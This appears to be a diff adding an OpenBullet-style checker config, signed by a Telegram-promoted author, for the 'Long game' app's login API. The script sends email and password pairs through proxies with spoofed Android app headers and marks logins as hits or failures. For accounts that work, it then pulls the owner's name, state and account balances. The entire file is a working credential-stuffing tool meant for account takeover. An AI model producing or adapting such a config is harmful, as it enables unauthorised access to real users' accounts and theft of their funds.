@@ -1,0 +1,108 @@
+[SETTINGS]
+{
+  "Name": "Long game",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-26T05:04:39.1462995+02:00",
+  "AdditionalInfo": "https://t.me/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://b2b.longga.me/auth/login" 
+  CONTENT "{\"email\":\"<USER>\",\"phone\":null,\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "lg-timezone: America/Chicago" 
+  HEADER "accept: application/json" 
+  HEADER "lg-version: 4.17.4" 
+  HEADER "lg-platform: android" 
+  HEADER "lg-deviceid: d3bc5afb8e58a458" 
+  HEADER "lg-appsflyerid: 1648262825501-7013166932181556133" 
+  HEADER "lg-pushtoken: elo0QbSFRK29WTBDU7J5d6:APA91bE0ilhXxleaOMxKUHL13ene9q-0D9-VjyTPq2m_bJX6MCu5grUoYad9SxcWRRgDdQhLflgIbpkUDZPQFacU3rt9GWUmbUbzsNXXT1n7bkVHtGDUHyVBx1qKqLWGlkGhOUXQHg0b" 
+
+#tm PARSE "<HEADERS(Date)>" LR "" "" -> VAR "tm" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "description\":\"Incorrect password.\"}}" 
+
+#token PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+#f PARSE "<SOURCE>" JSON "firstName" -> VAR "f" 
+
+#Name PARSE "<SOURCE>" JSON "firstName" CreateEmpty=FALSE -> CAP "Name" "<f> " "" 
+
+#state PARSE "<SOURCE>" JSON "state" CreateEmpty=FALSE -> CAP "state" 
+
+REQUEST GET "https://b2b.longga.me/account/list" 
+  
+  HEADER "lg-timezone: America/Chicago" 
+  HEADER "accept: application/json" 
+  HEADER "content-type: application/json" 
+  HEADER "lg-version: 4.17.4" 
+  HEADER "lg-platform: android" 
+  HEADER "lg-deviceid: d3bc5afb8e58a458" 
+  HEADER "lg-appsflyerid: 1648262825501-7013166932181556133" 
+  HEADER "lg-pushtoken: elo0QbSFRK29WTBDU7J5d6:APA91bE0ilhXxleaOMxKUHL13ene9q-0D9-VjyTPq2m_bJX6MCu5grUoYad9SxcWRRgDdQhLflgIbpkUDZPQFacU3rt9GWUmbUbzsNXXT1n7bkVHtGDUHyVBx1qKqLWGlkGhOUXQHg0b" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "Host: b2b.longga.me" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/4.9.1" 
+  HEADER "If-Modified-Since: <tm>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#currency PARSE "<SOURCE>" JSON "currency" -> VAR "currency" 
+
+#availableBalance PARSE "<SOURCE>" JSON "availableBalance" CreateEmpty=FALSE -> CAP "availableBalance" "" " <currency>" 
+
+#totalBalance PARSE "<SOURCE>" JSON "totalBalance" CreateEmpty=FALSE -> CAP "totalBalance" "" " <currency>" 
+
+#pendingBalance PARSE "<SOURCE>" JSON "pendingBalance" CreateEmpty=FALSE -> CAP "pendingBalance" "" " <currency>" 
+
+#BY FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "Checked by" 
+
